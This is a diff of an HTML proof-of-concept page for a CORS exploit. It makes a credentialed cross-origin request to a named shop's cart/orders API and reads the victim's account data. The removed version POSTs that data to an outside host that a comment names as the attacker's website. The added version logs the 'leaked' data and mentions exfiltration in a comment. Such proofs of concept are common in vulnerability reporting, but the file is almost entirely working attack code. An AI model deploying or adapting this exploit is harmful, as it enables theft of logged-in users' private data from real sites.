@@ -1,24 +1,19 @@
 <html>
-<body>
-<button type='button' onclick='cors()'>CORS</button>
-<p id='demo'></p>
-<script>
-function cors() {
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-var a = this.responseText; // Sensitive data from niche.co about user account
-document.getElementById("demo").innerHTML = a;
-xhttp.open("POST", "https://test.tulexx.pl/", true);// Sending that data to Attacker's website
-xhttp.withCredentials = true;
-console.log(a);
-xhttp.send("data="+a);
-}
-};
-xhttp.open("GET", "https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list?opca=", true);
-xhttp.withCredentials = true;
-xhttp.send();
-}
-</script>
-</body>
+  <body>
+    <script>
+      fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list?opca=", {
+        method: "GET",
+        credentials: "include",
+        headers: {
+          "Origin": "https://test.tulexx.pl/"
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Leaked Sensitive Data:", data);
+        // Or attacker could exfiltrate to external server
+      })
+      .catch(err => console.error(err));
+    </script>
+  </body>
 </html>
